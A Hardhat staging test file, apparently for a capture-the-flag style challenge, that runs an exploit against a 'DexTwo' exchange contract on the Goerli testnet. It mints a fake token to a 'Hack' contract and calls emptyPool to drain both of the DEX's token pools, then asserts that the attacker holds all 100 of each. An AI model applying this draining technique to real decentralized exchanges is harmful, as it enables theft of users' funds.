import { assert } from "chai"
import { network, ethers, } from "hardhat"
import { developmentChains,networkConfig } from "../../helper-hardhat-config"
import { DexTwo , Hack, Pina } from "../../typechain-types"
import abi from "../../artifacts/contracts/DexTwo.sol/DexTwo.json"
import erc20Abi from "../../artifacts/contracts/Pina.sol/Pina.json"


const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY) 

developmentChains.includes(network.name)
    ? describe.skip
    : describe("Dex hack staging", function () {
        let provider: any 
        let wallet:any
        let hack: Hack
        let addressContract: string
        let dexTwo: DexTwo
        let token: Pina
        let token1: Pina
        let token2: Pina
        let addressToken1:string
        let addressToken2:string

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
            
            hack = await ethers.getContract("Hack")
            token = await ethers.getContract("Pina")
            addressContract = networkConfig[network.config.chainId!]["contractAddress"]!
            dexTwo = new ethers.Contract(addressContract,abi.abi,wallet)

            addressToken1 = await dexTwo.token1()
            addressToken2 = await dexTwo.token2()
            token1 = new ethers.Contract(addressToken1,erc20Abi.abi,wallet)
            token2 =new ethers.Contract(addressToken2,erc20Abi.abi,wallet)
            
        })
        
        describe("Try hack Dex", function () {
            it("Setup", async() => {
                const tx = await token.mint(addressContract,hack.address,1,3)
                await tx.wait(1)
                const tx2 = await hack.setTokenAddress() 
                await tx2.wait(1)
                let balanceToken = (await token.balanceOf(dexTwo.address)).toString()
                let balanceTokenHack = (await token.balanceOf(hack.address)).toString()
                assert.equal(balanceToken,"1")
                assert.equal(balanceTokenHack,"3")
                
                let addressTokenHack:string = await hack.token1()
                
                assert.equal(addressTokenHack,addressToken1)
            })
            it("Empty pools", async() => {
                const tx = await hack.emptyPool(1,addressToken1)
                await tx.wait(1)
                const tx2 = await hack.emptyPool(2,addressToken2)
                await tx2.wait(1)
                let balance = (await token1.balanceOf(hack.address)).toString()
                assert.equal(balance,"100")
                balance = (await token2.balanceOf(hack.address)).toString()
                assert.equal(balance,"100")
            })   
           
        })
    })
        
    